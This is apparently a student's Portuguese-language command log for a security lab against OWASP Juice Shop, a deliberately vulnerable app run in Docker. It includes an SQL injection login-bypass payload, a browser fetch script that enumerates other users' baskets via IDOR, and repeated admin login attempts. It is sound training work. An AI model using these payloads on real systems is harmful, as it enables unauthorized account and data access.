# Comandos utilizados no Trabalho 1 - Case Prático 1 (Juice Shop)

## 1. Subir o ambiente Docker

docker run --rm -d -p 3000:3000 --name juiceshop bkimminich/juice-shop

## 2. Verificar se o container está rodando

docker ps

## 3. Comandos de diagnóstico usados quando o Codespace hibernou enquanto foi realizado o relatório

docker ps -a
docker start juiceshop
docker rm -f juiceshop
docker run --rm -d -p 3000:3000 --name juiceshop bkimminich/juice-shop

## 4. Teste interno de conectividade 

curl http://localhost:3000

## 5. Acesso à aplicação

URL do Codespaces via aba PORTS
- https://turbo-train-5w6qv5p9qjhv7rg-3000.app.github.dev

## 6. A03 - SQL Injection (login bypass)

Payload usado no campo de e-mail da tela de login:
' OR 1=1--

Senha: 123

## 7. A02 - Cryptographic Failures

Inspeção manual via DevTools (F12) > aba Network e Application/Cookies,
verificando flags Secure/HttpOnly dos cookies e dados expostos em:
GET /rest/user/whoami

## 8. A01 - Broken Access Control (IDOR na cesta de outro usuário)

Passo 1 - Capturado token de autenticação da própria conta via DevTools
(Network > requisição autenticada > Request Headers > Authorization)

Passo 2 - Executado no Console do DevTools do navegador:

fetch("https://turbo-train-5w6qv5p9qjhv7rg-3000.app.github.dev/rest/basket/1", {
  headers: {
    "Authorization": "Bearer TOKEN"
  }
})
.then(r => r.json())
.then(data => console.log(data));

(Repetido trocando o número final da URL pra achar outros: /rest/basket/2, /rest/basket/3, etc.)

## 9. A05 - Security Misconfiguration

curl -I http://localhost:3000

curl http://localhost:3000/pagina

## 10. A07 - Identification and Authentication Failures

Tentativas manuais e repetidas de login via interface, na tela /#/login:
- E-mail: admin@juice-sh.op
- Senha: várias tentativas erradas em sequência 
Observado: nenhum bloqueio, captcha ou aviso de limite de tentativas.

## 11. A09 - Security Logging and Monitoring Failures

Análise qualitativa (sem comando adicional): observação de que as ações dos
itens A01, A03 e A07 não geraram nenhum alerta, bloqueio ou log visível
por parte da aplicação.

## 12. Organização final do repositório

mkdir -p scripts evidencias relatorio
touch scripts/comandos.md
touch README.md
git add .
git commit -m "Primeiro Commit evidencias e comandos"
git push